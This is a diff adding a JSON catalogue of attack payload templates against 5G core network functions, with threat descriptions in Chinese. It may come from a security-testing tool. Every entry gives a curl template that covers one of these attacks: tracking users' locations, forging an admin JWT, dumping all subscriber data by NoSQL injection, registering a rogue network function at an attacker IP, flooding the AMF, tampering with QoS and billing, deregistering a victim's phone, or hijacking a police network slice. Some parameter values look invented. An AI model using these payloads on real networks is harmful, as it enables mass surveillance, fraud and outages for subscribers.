@@ -1,0 +1,90 @@
+[
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "NEF",
+      "threat_name": "N33_API_BOLA_Exploit",
+      "vulnerability_type": "BOLA/IDOR",
+      "description": "NEF N33 接口 Location Retrieval API 缺乏对象级授权校验，允许使用低权限合法 Token 遍历查询其他用户的经纬度位置。",
+      "payload_template": "curl -s -X POST 'https://{TARGET_IP}/location-retrieval/v1/retrieve' -H 'Authorization: Bearer {LEGAL_TOKEN}' -H 'Content-Type: application/json' -d '{\"device\": {\"phoneNumber\": \"{TARGET_PHONE}\"}, \"maxAge\": 60}' -k"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "NEF",
+      "threat_name": "JWT_Alg_None_Bypass",
+      "vulnerability_type": "Authentication Bypass",
+      "description": "NEF 网关的 JWT 解析库存在算法混淆漏洞，允许将 alg 设为 none 并去除签名，从而越权获取管理员策略。",
+      "payload_template": "curl -s -X GET 'https://{TARGET_IP}/3gpp-traffic-influence/v1/policies' -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiJ9.' -k -i"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "UDM",
+      "threat_name": "Nudm_SDM_NoSQL_Injection",
+      "vulnerability_type": "NoSQL Injection",
+      "description": "UDM (统一数据管理) 的订阅数据管理接口 (SDM) 存在输入校验不严。攻击者通过内部微服务接口，在 SUPI 参数处注入 NoSQL 语法 (如 $ne: null)，可绕过单用户限制，全量 Dump 核心网所有用户的鉴权和隐私数据。",
+      "payload_template": "curl -s -X GET 'https://{TARGET_IP}/nudm-sdm/v2/imsi-{$ne:null}/sm-data' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -H 'Accept: application/json' -k"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "NRF",
+      "threat_name": "Nnrf_NFManagement_Rogue_Registration",
+      "vulnerability_type": "Service Spoofing / Rogue NF",
+      "description": "NRF (网络存储库功能) 缺乏对注册网元真实物理身份的二次校验。攻击者可向 NRF 发送伪造的 PUT 请求，注册一个恶意的虚假 PCF 或 UDM 网元，从而劫持整个核心网的业务路由，实现中间人攻击。",
+      "payload_template": "curl -s -X PUT 'https://{TARGET_IP}/nnrf-nfm/v1/nf-instances/{FAKE_UUID}' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -H 'Content-Type: application/json' -d '{\"nfInstanceId\": \"{FAKE_UUID}\", \"nfType\": \"PCF\", \"nfStatus\": \"REGISTERED\", \"ipv4Addresses\": [\"{ATTACKER_IP}\"], \"priority\": 1}' -k"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "AMF",
+      "threat_name": "Namf_Communication_Signaling_Storm",
+      "vulnerability_type": "Denial of Service (DoS)",
+      "description": "AMF 负责处理所有基站和手机的信令。如果接口未做速率限制，攻击者可通过循环发送畸形上下文传输请求，耗尽 AMF 内存，导致大面积断网。",
+      "payload_template": "for i in {1..100}; do curl -s -X POST 'https://{TARGET_IP}/namf-comm/v1/ue-contexts/transfer' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -H 'Content-Type: application/json' -d '{\"reason\": \"HANDOVER\", \"accessType\": \"3GPP_ACCESS\", \"transferReason\": \"MALICIOUS_PAYLOAD_TEST\"}' --max-time 2 -k ; done"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "SMF",
+      "threat_name": "Nsmf_PDUSession_QoS_Hijack",
+      "vulnerability_type": "Business Logic Flaw / Parameter Tampering",
+      "description": "SMF 负责用户的流量通道建立和限速。攻击者通过越权访问会话修改接口，直接篡改特定用户的 QoS 配置文件，实现免费的“无限提速”。",
+      "payload_template": "curl -s -X POST 'https://{TARGET_IP}/nsmf-pdusession/v1/sm-contexts/{TARGET_SESSION_ID}/modify' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -H 'Content-Type: application/json' -d '{\"qosFlowsAddModRequestList\": [{\"qfi\": 1, \"qosRules\": \"HIGHEST_PRIORITY_BYPASS\"}]}' -k"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "PCF",
+      "threat_name": "Npcf_Policy_ZeroRating_Bypass",
+      "vulnerability_type": "Billing/Policy Bypass",
+      "description": "PCF 负责下发用户的计费策略。攻击者伪造请求修改策略决策，将特定数据流的计费组修改为免费或离线计费，实现“无限免费流量”。",
+      "payload_template": "curl -s -X POST 'https://{TARGET_IP}/npcf-smpolicycontrol/v1/sm-policies/{TARGET_POLICY_ID}/update' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -H 'Content-Type: application/json' -d '{\"policyDecisions\": {\"chargingDecisions\": {\"chgId\": \"ZERO_RATING_GROUP_001\", \"offline\": true}}}' -k"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "UDM",
+      "threat_name": "Nudm_UECM_Targeted_Deregistration",
+      "vulnerability_type": "Targeted DoS",
+      "description": "攻击者向 UECM 接口发送恶意的注销请求，指定受害者的 SUPI，导致受害者手机瞬间失去 5G 信号，且极难排查原因。",
+      "payload_template": "curl -s -X POST 'https://{TARGET_IP}/nudm-uecm/v1/{TARGET_SUPI}/registrations/amf-3gpp-access/dereg-info' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -H 'Content-Type: application/json' -d '{\"deregReason\": \"SUBSCRIPTION_WITHDRAWN\", \"accessType\": \"3GPP_ACCESS\"}' -k"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "NSSF",
+      "threat_name": "Nnssf_Network_Slice_Hijacking",
+      "vulnerability_type": "Privilege Escalation",
+      "description": "NSSF 负责切片选择。攻击者篡改 S-NSSAI 参数，强行将自己的会话路由到高权限的政务专网切片中，实现内网穿透。",
+      "payload_template": "curl -s -X GET 'https://{TARGET_IP}/nnssf-nsselection/v2/network-slice-information?nfId={ATTACKER_NF_ID}&slice-info-request-for-pdu-session={\"sNssai\": {\"sst\": 1, \"sd\": \"ADMIN_POLICE_SLICE_007\"}}' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -k"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "AUSF",
+      "threat_name": "Nausf_5G_AKA_Downgrade",
+      "vulnerability_type": "Authentication Downgrade",
+      "description": "攻击者拦截认证流程，向 AUSF 发起降级请求，尝试绕过强力校验，或者诱发序列号同步失败，导致大面积用户无法通过鉴权。",
+      "payload_template": "curl -s -X POST 'https://{TARGET_IP}/nausf-auth/v1/ue-authentications' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -H 'Content-Type: application/json' -d '{\"supiOrSuci\": \"{TARGET_SUPI}\", \"servingNetworkName\": \"5G:mnc000.mcc000.3gppnetwork.org\", \"authType\": \"EAP_AKA_PRIME_DOWNGRADE_TEST\"}' -k"
+    },
+    {
+      "target_node_type": "NetworkFunction",
+      "target_node_name": "BSF",
+      "threat_name": "Nbsf_Management_VIP_Tracking",
+      "vulnerability_type": "Data Leakage",
+      "description": "攻击者通过遍历探测 Nbsf_Management API，精确获知高价值 VIP 用户的 IP 目前处于哪个核心网区域，为后续精准打击踩点。",
+      "payload_template": "curl -s -X GET 'https://{TARGET_IP}/nbsf-management/v1/pcfBindings?ipv4Addr={VICTIM_IP_ADDRESS}' -H 'Authorization: Bearer {INTERNAL_TOKEN}' -k -i"
+    }
+  ]
